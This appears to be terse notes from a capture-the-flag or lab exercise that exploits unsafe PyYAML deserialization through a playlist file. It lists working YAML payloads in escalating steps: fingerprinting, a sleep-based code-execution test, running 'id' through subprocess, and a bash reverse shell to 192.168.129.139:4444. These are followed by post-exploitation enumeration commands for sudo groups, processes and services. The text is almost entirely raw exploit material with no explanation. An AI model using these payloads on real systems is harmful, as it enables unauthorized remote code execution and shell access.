
##Fingerprint PyYAML object support
```
playlist:
  name: !!python/tuple [Sunset, Session]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
 ```     
##2. Harmless time-delay RCE test
```
playlist:
  name: !!python/object/apply:time.sleep [5]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```      
##3 harmless command and capture its output:      
 ```     
playlist:
  name: !!python/object/apply:subprocess.check_output
    args:
      - ["id"]
    kwds:
      text: true
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien      
 ```     
##shell      
```      
playlist:
  name: !!python/object/apply:subprocess.Popen
    args:
      - ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.129.139/4444 0>&1"]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien      
```
```
getent group sudo
```
```
ps aux
```
```
ps -eo user,pid,ppid,args --forest
```
```
systemctl status 609
```
```
cat /proc/609/cgroup
```
```
systemctl list-units --type=service --state=running --no-pager
```
```
systemctl status jukeboxd.service --no-pager --full
```
```
ps -ww -p 609 -o user,pid,args
```
```
tr '\0' '\n' < /proc/609/cmdline
```
